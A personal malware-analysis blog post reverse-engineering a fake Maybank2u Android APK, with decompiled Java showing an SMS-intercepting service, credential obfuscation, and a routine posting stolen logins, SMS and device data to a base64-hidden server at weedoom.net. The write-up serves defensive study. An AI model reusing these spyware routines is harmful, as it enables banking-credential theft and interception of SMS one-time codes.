---
date: '2025-05-04T14:56:10+08:00'
title: 'Android Spyware Maybank2u APK'
tags:
    - malicious APK
    - Android
---

## Description

> I asked this APK from Fareed after I saw his post in [X](https://x.com/frdfzi/status/1914682801674240012) and decided to have a look into it.

## Analyzing APK

This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first. 

### Static Analysis

I started out with both `jadx` and `apktool` but it has some error which fail to decompile the APK.

```bash
jadx .\Maybank2u.apk
INFO  - loading ...
ERROR - Failed to process zip file: .\Maybank2u.apk
jadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .\Maybank2u.apk
...[snip]...
Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry)
...[snip]...
```

```bash
apktool d .\Maybank2u.apk
I: Using Apktool 2.10.0 on Maybank2u.apk with 8 thread(s).
Exception in thread "main" brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry)
...[snip]...
Caused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry)
...[snip]...
Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry)
```

Based on both the error, I somehow could not decompile it due to this `invalid CEN header`. After poking around, I found out something interesting. 

```bash
unzip Maybank2u.apk
Archive:  Maybank2u.apk
[Maybank2u.apk] AndroidManifest.xml password:
   skipping: AndroidManifest.xml     incorrect password
  inflating: classes.dex
...[snip]...
```

Somehow, the `AndroidManifest.xml` is password protected while the remaining files can be unzipped. `AndroidManifest.xml` is something important as it contains a lot of information. Although I could not get the `AndroidManifest.xml`, I still have chances to understand the application as `classes.dex` is extracted from the zip file. It is possible to open `classes.dex` in `jadx-gui` without any error. The only downside is I will have to understand the code without `AndroidManifest.xml`.

```java
if (getSharedPreferences("app_data_launch_f", 0).getBoolean("isFirstRun", true)) {
    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    String locale = Locale.getDefault().toString();
    int hashCode3 = locale.hashCode();
    String str2 = "Ruxsatlar talab qilinadi";
```

Based on what I understand from the code, this is checking if the `isFirstRun` value is true or not in shared preferences. If the condition is met, it will request permission for the application and allow the application to work as intended. Something interesting is it uses `Ruxsatlar talab qilinadi` which is Uzbek and `Разрешить` which is Russian words aside from English. 

```java
N8.a(this, new O8(-425911099, new Bn(this, i), true));
```

If I did not meet the condition mentioned above, the application will instead start this `a` function which seems like some other kind of interface.

```java
startService(new Intent(this, (Class<?>) MgRKn55kcebb482e4b514772964e31012d0b1157.class));
```

One more things that I noticed is on the end of the `onCreate` function, there's this `startService` function which send intent to the class.

```java
public final class MgRKn55kcebb482e4b514772964e31012d0b1157 extends Service {
    public RE Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b;

    public final IBinder GZhJfnKSd3bcf0449614b4f9f971198a1927183cd(Intent intent) {
        return null;
    }

    public final int L3SIZ9rLe3f0e2e3fd01496286efcad0fda547f6(Intent intent, int i, int i2) {
        this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b = new RE();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.setPriority(1000);
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b;
        if (re != null) {
            registerReceiver(re, intentFilter);
            return 2;
        }
        AbstractC0641jk.U("receiver");
        throw null;
    }

    @Override // android.app.Service
    public final void onDestroy() {
        RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b;
        if (re == null) {
            AbstractC0641jk.U("receiver");
            throw null;
        }
        unregisterReceiver(re);
        super.onDestroy();
    }
}
```

This class looks like a service that will trigger the broadcast receiver `onReceive` function to receive SMS messages. Aside from that, I really have no idea at the moment and decided to perform dynamic analysis


### Dynamic Analysis

I started out by installing the malicious APK into my emulator. 

![alt text](img/index.png#center)

I then start to play around with the application.

![alt text](img/index-1.png#center)

It does requesting permission, let see what permission it is asking.

![alt text](img/index-2.png#center)
![alt text](img/index-3.png#center)
![alt text](img/index-4.png#center)
![alt text](img/index-5.png#center)

It is requesting permission for contact, phone calls, SMS and running in background. These permissions are dangerous and should not be allowed especially when the APK is suspicious. But since I am performing analysis, I will need to provide these permissions in order to understand the application.

![alt text](img/index-6.png#center)

Looking into the first page, It is a login page which asked for username and password. I then tried to have a look at the code which have the keywords of `username`, `password`, `login`.

```java
public final Object c() {
    MainActivity mainActivity;
    Uo uo = this.g;
    if (!((Boolean) uo.getValue()).booleanValue()) {
        Uo uo2 = this.h;
        int length = ((String) uo2.getValue()).length();
        Uo uo3 = this.i;
        if (length < 6) {
            uo3.setValue("Input Username between 6 and 16 characters.");
        } else {
            Uo uo4 = this.j;
            if (((String) uo4.getValue()).length() < 6) {
                uo3.setValue("Invalid username/password.");
            } 
```

I found one that looks interesting which it checks if the input and will provide some feedback if the input is 6 or lower.

![alt text](img/index-7.png#center)
![alt text](img/index-8.png#center)

Look's like the code is for username and password length. If both of the input meet the requirement of 7 characters and above, it will perform something which has very long code.

```java
public static String b(String str) {
    int i;
    int i2;
    int i3;
    AbstractC0641jk.v(str, "input");
    byte[] bytes = str.getBytes(AbstractC0755m7.a);
    AbstractC0641jk.u(bytes, "this as java.lang.String).getBytes(charset)");
    String encodeToString = Base64.encodeToString(bytes, 2);
    AbstractC0641jk.s(encodeToString);
    StringBuilder sb = new StringBuilder();
    int length = encodeToString.length();
    for (int i4 = 0; i4 < length; i4++) {
        char charAt = encodeToString.charAt(i4);
        if (Character.isLowerCase(charAt)) {
            i2 = 97;
            if ('a' <= charAt && charAt < '{') {
                i3 = (charAt - 'Y') % 26;
                i = i3 + i2;
                charAt = (char) i;
                sb.append(charAt);
            }
        }
        if (!Character.isLowerCase(charAt) || 1072 > charAt || charAt >= 1104) {
            if (Character.isUpperCase(charAt)) {
                i2 = 65;
                if ('A' <= charAt && charAt < '[') {
                    i3 = (charAt - '9') % 26;
                    i = i3 + i2;
                }
            }
            if (Character.isUpperCase(charAt)) {
                i2 = 1040;
                if (1040 <= charAt && charAt < 1072) {
                    i3 = (charAt - 1032) % 32;
                    i = i3 + i2;
                }
            }
            if (Character.isDigit(charAt)) {
                i = ((charAt - '(') % 10) + 48;
            } else {
                sb.append(charAt);
            }
        } else {
            i = ((charAt - 1064) % 32) + 1072;
        }
        charAt = (char) i;
        sb.append(charAt);
    }
    String sb2 = sb.toString();
    AbstractC0641jk.u(sb2, "toString(...)");
    return sb2;
}
```

I noticed that this function will be triggered after some information is collected. This function looks like base64 encode the strings and character permutation. 

```java
public void d(JSONObject jSONObject, boolean z) {
    String concat;
    Xp xp = new Xp();
    if (z) {
        byte[] decode = Base64.decode("aHR0cHM6Ly93ZWVkb29tLm5ldA==", 0);
        AbstractC0641jk.s(decode);
        concat = new String(decode, AbstractC0755m7.a).concat("/minit");
    } else {
        byte[] decode2 = Base64.decode("aHR0cHM6Ly93ZWVkb29tLm5ldA==", 0);
        AbstractC0641jk.s(decode2);
        concat = new String(decode2, AbstractC0755m7.a).concat("/multipush");
    }
    try {
        Gl gl = new Gl();
        gl.m(concat);
        Pattern pattern = Vn.c;
        Vn z2 = AbstractC0597ik.z("application/json; charset=utf-8");
        String jSONObject2 = jSONObject.toString();
        AbstractC0641jk.u(jSONObject2, "toString(...)");
        gl.l("POST", AbstractC0597ik.s(z2, jSONObject2));
        byte[] decode3 = Base64.decode("QmV0YQ==", 0);
        AbstractC0641jk.s(decode3);
        String b = b(new String(decode3, AbstractC0755m7.a));
        C0236ai c0236ai = (C0236ai) gl.c;
        c0236ai.getClass();
        AbstractC0737lq.o("auth");
        AbstractC0737lq.t(b, "auth");
        c0236ai.a("auth", b);
        String string = Settings.Secure.getString(this.a.getContentResolver(), "android_id");
        AbstractC0641jk.u(string, "getString(...)");
        String b2 = b(string);
        C0236ai c0236ai2 = (C0236ai) gl.c;
        c0236ai2.getClass();
        AbstractC0737lq.o("id");
        AbstractC0737lq.t(b2, "id");
        c0236ai2.a("id", b2);
        new C0563hu(xp, gl.e()).e(new Yw(11));
    } catch (Exception unused) {
    }
}
```

I then noticed another function is triggered. This function looks like some HTTP URL connection where it use POST method to send a JSON object. The URL is `https://weedoom.net` and it has 2 endpoint `/minit` and `/multipush`. Since the function input `c0044Fe.d(jSONObject, true);` is true, the `/multipush` is not likely used in this case. After understanding all, I tried to send a fake creds and see it it's correct.

![alt text](img/index-9.png#center)

After providing an input 7 or more in both usernamd and password field, I was redirected to this page. I then looked into my web proxy and see if any request is sent. 

![alt text](img/index-10.png#center)

A request was sent to `https://weedoom.net/minit`. I then tried to decode based on the function `b` and see what kind of information they have collected.

- username and password
- list of application installed
- SMS received
- most likely SIM card information

Looking into the screenshot, I also noticed that `https://weedoom.net/multipush` was triggered from somewhere else. It has something to do with the broadcast receiver where when a new SMS is received, it will send the information to `https://weedoom.net/multipush`.

![alt text](img/index-11.png#center)

## Things I learned from the APK 

- you can protect AndroidManifest.xml ???
- reverse engineer a simple malicious APK